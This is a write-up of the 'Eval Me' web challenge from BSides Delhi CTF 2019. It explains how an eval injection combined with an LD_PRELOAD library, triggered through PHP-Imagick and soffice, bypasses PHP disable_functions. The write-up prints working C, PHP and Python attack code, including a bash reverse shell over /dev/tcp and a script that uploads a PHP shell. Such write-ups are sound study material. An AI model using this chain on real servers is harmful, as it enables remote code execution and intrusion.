---
title: Eval Me - Bsides Delhi CTF 2019
date: 2019-10-23 10:10:10
author: c3rb3ru5
author_url: https://twitter.com/__c3rb3ru5__
categories:
  - Web Exploitation
tags:
  - PHP
  - Write-up
---
Write-up of Eval Me challenge from BSides Delhi CTF 2019

tl;dr Bypassing disable_functions using PHP-Imagick and Soffice
<!--more-->


In this challenge made by SpyD3r, we are directly given the source code of the PHP file. There is a sandbox being created for each user to reduce interaction between players. Then there is a direct eval without any sort of blacklisting of filtering of user input:

```
eval($_GET['input']);
```

But when we try to read the phpinfo() file, then we realise that most of the PHP functions and all the system functions that could lead to code execution are disabled:

```
disable_functions = pcntl_alarm,pcntl_fork,pcntl_waitpid,pcntl_wait,pcntl_wifexited,pcntl_wifstopped,pcntl_wifsignaled,pcntl_wifcontinued,pcntl_wexitstatus,pcntl_wtermsig,pcntl_wstopsig,pcntl_signal,pcntl_signal_get_handler,pcntl_signal_dispatch,pcntl_get_last_error,pcntl_strerror,pcntl_sigprocmask,pcntl_sigwaitinfo,pcntl_sigtimedwait,pcntl_exec,pcntl_getpriority,pcntl_setpriority,stream_socket_sendto,stream_socket_client,pcntl_async_signals,error_log,system,exec,shell_exec,popen,proc_open,passthru,link,symlink,syslog,imap_open,ld,mail,file_put_contents,scandir,file_get_contents,readfile,fread,fopen,chdir
```

But we see that there are some modules that are installed on the server from the phpinfo() output.

We can use PHP-Imagick and Libre-office which has been installed in the server. We can use these two modules combined to perform LD_PRELOAD and bypass disable_functions.

So we write a program in C, by basically overwriting fwrite that is used while we use PHP-Imagick. We unset the previously set LD_PRELOAD variable and then execute the system command and perform a reverse shell to our server ip.

```c
#include <stdio.h>
#include <stdlib.h>

size_t fwrite(const void *ptr, size_t size, size_t nmemb,FILE *stream){
	unsetenv("LD_PRELOAD");
	system("bash -c \"sh -i >& /dev/tcp/127.0.0.1/1234 0>&1\"");
	return 1;
}
```

Now we just have to compile the code, upload it to the server, overwrite the LD_PRELOAD variable with the binary that we uploaded and then use PHP-Imagick to invoke the system command.

We compile the C code as a shared libray to say some file exploit.txt and using this script we move that to the /tmp folder and chmod it to give executing permissions and then overwrite the LD_PRELOAD environment variable using putenv() function.

Then we need use PHP-Imagick such that we internally invoke soffice which internally uses execve.

```php
<?php

rename("./exploit.txt","/tmp/exploit.txt");
chmod("/tmp/exploit.txt",0755);
putenv("LD_PRELOAD=/tmp/exploit.txt");
$im = new imagick();
$im->readImage('./Assignment1.docx');
$im->setImageFormat("jpg");
$im->writeImage("./BoardReport.jpg");

?>
```

We then upload both the scripts using the eval function provided by using the move_uploaded_file() function to upload the files.

```python
#!/usr/bin/env python2

import requests

url1 = "http://34.67.7.120/?input=move_uploaded_file($_FILES['evil']['tmp_name'],'./exploit.txt');"
url2 = "http://34.67.7.120/?input=move_uploaded_file($_FILES['evil']['tmp_name'],'./phpSHELL.php');"


files = {'evil':open('exploit.txt','rb')}

files2 = {'evil':open('phpSHELL.php','rb')}

requests.post(url1, files=files)
requests.post(url2, files=files2)

req = requests.get("http://34.67.7.120/")
folder = req.text[:32]

print folder

requests.get("http://34.67.7.120/xxx/" + str(folder) + "/phpSHELL.php")
```

Then last we have sent a request to the phpshell that we uploaded, and our system command gets executed and we get a reverse shell.

Then we see that there is a flag text file in the root folder, but only the root can read it. But there is a readFlag setuid binary which on executing reads and prints the flag file.
